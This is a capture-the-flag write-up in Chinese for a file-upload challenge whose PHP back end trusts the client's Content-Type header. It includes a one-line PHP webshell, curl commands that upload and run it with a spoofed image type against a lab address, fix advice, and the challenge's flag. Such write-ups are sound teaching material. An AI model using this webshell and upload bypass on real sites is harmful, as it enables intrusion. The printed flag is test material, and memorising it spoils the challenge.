# WP：05-file-upload

## 题目信息

- 类型：文件上传漏洞
- 难度：Easy
- 端口：13385

## 分析

上传页面声称只允许图片，但后端只检查了 `Content-Type` HTTP 头：

```php
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed)) {
    die('仅允许上传 jpg/png/gif 格式。');
}
```

`Content-Type` 由客户端发送，完全可控。

## 解题

上传一个 PHP webshell，将 `Content-Type` 篡改为 `image/jpeg`：

```bash
echo '<?php system("cat /flag"); ?>' > shell.php
curl -s http://172.16.173.140:13385/ \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=1"
```

上传成功后访问 `/uploads/shell.php` 即可执行命令。

```bash
curl http://172.16.173.140:13385/uploads/shell.php
```

## 修复建议

永远不要信任客户端的 MIME 类型。应当：
- 检查文件内容魔术数字（getimagesize 等）
- 限制上传目录不可执行 PHP
- 重命名文件，去除原始扩展名

## Flag

`flag{file_upload_is_not_secure}`
